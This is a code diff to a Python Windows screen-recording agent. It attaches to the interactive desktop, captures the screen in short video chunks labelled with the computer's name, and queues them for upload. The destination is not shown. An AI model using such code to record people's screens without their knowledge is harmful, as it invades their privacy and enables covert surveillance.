@@ -167,18 +167,24 @@ CHUNK_MINUTES = int(CONFIG.get("video_chunk_minutes", 2))
 
 # ----------------- 1. RELIABLE NON-BLACK SCREEN CAPTURE -----------------
 
-def capture_desktop_image():
-    """
-    Captures Windows desktop screen reliably.
-    Attaches thread to interactive desktop session to ensure NO BLACK SCREEN.
-    """
+def ensure_interactive_desktop():
+    """Attaches the calling Windows thread to the active interactive input desktop (WinSta0\\default)."""
     try:
         user32 = ctypes.windll.user32
         desk = user32.OpenInputDesktop(0, False, 0x01FF)
         if desk:
             user32.SetThreadDesktop(desk)
+            return True
     except Exception:
         pass
+    return False
+
+def capture_desktop_image():
+    """
+    Captures Windows desktop screen reliably.
+    Attaches thread to interactive desktop session to ensure NO BLACK SCREEN.
+    """
+    ensure_interactive_desktop()
 
     # Method 1: Pillow ImageGrab
     try:
@@ -459,77 +465,119 @@ def video_recorder_worker():
     for prev_file in TEMP_DIR.glob("*.mp4"):
         upload_queue.put(str(prev_file))
 
+    ensure_interactive_desktop()
     sct_class = getattr(mss, "MSS", mss.mss)
-    with sct_class() as sct:
+    sct = None
+    try:
+        sct = sct_class()
         mon = sct.monitors[1]
-        width = mon["width"]
-        height = mon["height"]
-
-        # Ensure dimensions are divisible by 16 for H.264 video compatibility
-        width = (width // 16) * 16
-        height = (height // 16) * 16
+        width = (mon["width"] // 16) * 16
+        height = (mon["height"] // 16) * 16
         capture_box = {"top": mon["top"], "left": mon["left"], "width": width, "height": height}
-        fallback_frame = np.zeros((height, width, 3), dtype=np.uint8)
+    except Exception:
+        user32 = ctypes.windll.user32
+        sw = user32.GetSystemMetrics(0) or 1600
+        sh = user32.GetSystemMetrics(1) or 900
+        width = (sw // 16) * 16
+        height = (sh // 16) * 16
+        capture_box = {"top": 0, "left": 0, "width": width, "height": height}
 
-        while True:
-            if not VIDEO_RECORDING_ENABLED:
-                time.sleep(5)
-                continue
+    fallback_frame = np.zeros((height, width, 3), dtype=np.uint8)
 
-            current_fps = max(1, min(60, VIDEO_FPS))
-            current_chunk_min = max(1, CHUNK_MINUTES)
-            target_frame_time = 1.0 / current_fps
+    while True:
+        if not VIDEO_RECORDING_ENABLED:
+            time.sleep(5)
+            continue
 
-            timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
-            video_filename = f"[{COMPUTER_NAME}]_{timestamp_str}.mp4"
-            current_video_path = TEMP_DIR / video_filename
+        ensure_interactive_desktop()
+        current_fps = max(1, min(60, VIDEO_FPS))
+        current_chunk_min = max(1, CHUNK_MINUTES)
+        target_frame_time = 1.0 / current_fps
 
-            try:
-                writer = imageio.get_writer(
-                    str(current_video_path),
-                    fps=current_fps,
-                    codec="libx264",
-                    quality=6,
-                    pixelformat="yuv420p",
-                    macro_block_size=16,
-                    output_params=["-movflags", "+faststart"]
-                )
-            except Exception as err:
-                print(f"[{COMPUTER_NAME}] Video writer error: {err}")
-                time.sleep(3)
-                continue
+        timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
+        video_filename = f"[{COMPUTER_NAME}]_{timestamp_str}.mp4"
+        current_video_path = TEMP_DIR / video_filename
 
-            chunk_start_time = time.time()
-            chunk_end_time = chunk_start_time + (current_chunk_min * 60)
-            frame_count = 0
+        try:
+            writer = imageio.get_writer(
+                str(current_video_path),
+                fps=current_fps,
+                codec="libx264",
+                quality=6,
+                pixelformat="yuv420p",
+                macro_block_size=16,
+                output_params=["-movflags", "+faststart"]
+            )
+        except Exception as err:
+            print(f"[{COMPUTER_NAME}] Video writer error: {err}")
+            time.sleep(3)
+            continue
 
-            while time.time() < chunk_end_time and VIDEO_RECORDING_ENABLED:
-                loop_start = time.time()
+        chunk_start_time = time.time()
+        chunk_end_time = chunk_start_time + (current_chunk_min * 60)
+        frame_count = 0
+        last_valid_frame = None
+
+        while time.time() < chunk_end_time and VIDEO_RECORDING_ENABLED:
+            loop_start = time.time()
+            rgb_frame = None
+
+            # 1. Fast MSS Capture
+            if sct is not None:
                 try:
                     raw_frame = np.array(sct.grab(capture_box))
-                    rgb_frame = raw_frame[:, :, [2, 1, 0]]
-                    writer.append_data(rgb_frame)
-                    frame_count += 1
+                    f = raw_frame[:, :, [2, 1, 0]]
+                    if f.mean() > 0.5:
+                        rgb_frame = f
                 except Exception:
+                    ensure_interactive_desktop()
                     try:
-                        writer.append_data(fallback_frame)
-                        frame_count += 1
+                        sct = sct_class()
                     except Exception:
                         pass
 
-                elapsed = time.time() - loop_start
-                sleep_time = target_frame_time - elapsed
-                if sleep_time > 0:
-                    time.sleep(sleep_time)
+            # 2. Robust Pillow ImageGrab fallback (guarantees real screen capture)
+            if rgb_frame is None:
+                try:
+                    img = ImageGrab.grab(all_screens=True)
+                    if img:
+                        if img.size != (width, height):
+                            img = img.resize((width, height))
+                        f = np.array(img)
+                        if f.mean() > 0.5:
+                            rgb_frame = f
+                except Exception:
+                    pass
+
+            # 3. Hold last valid frame (never write black screen during momentary switch)
+            if rgb_frame is None and last_valid_frame is not None:
+                rgb_frame = last_valid_frame
+
+            # 4. Fallback if no frame ever succeeded
+            if rgb_frame is None:
+                rgb_frame = fallback_frame
+            else:
+                last_valid_frame = rgb_frame
 
             try:
-                writer.close()
-                if frame_count > 0 and current_video_path.exists():
-                    size_mb = round(current_video_path.stat().st_size / (1024 * 1024), 2)
-                    print(f"[{COMPUTER_NAME}] Finished {CHUNK_MINUTES}-min video clip: {video_filename} ({size_mb} MB)")
-                    upload_queue.put(str(current_video_path))
-            except Exception as e:
-                print(f"[{COMPUTER_NAME}] Error closing video writer: {e}")
+                writer.append_data(rgb_frame)
+                frame_count += 1
+            except Exception:
+                pass
+
+            elapsed = time.time() - loop_start
+            sleep_time = target_frame_time - elapsed
+            if sleep_time > 0:
+                time.sleep(sleep_time)
+
+        try:
+            writer.close()
+            if frame_count > 0 and current_video_path.exists():
+                size_mb = round(current_video_path.stat().st_size / (1024 * 1024), 2)
+                print(f"[{COMPUTER_NAME}] Finished {current_chunk_min}-min video clip: {video_filename} ({size_mb} MB)")
+                upload_queue.put(str(current_video_path))
+        except Exception as e:
+            print(f"[{COMPUTER_NAME}] Error closing video writer: {e}")
 
 # ----------------- MAIN FLOW -----------------
 
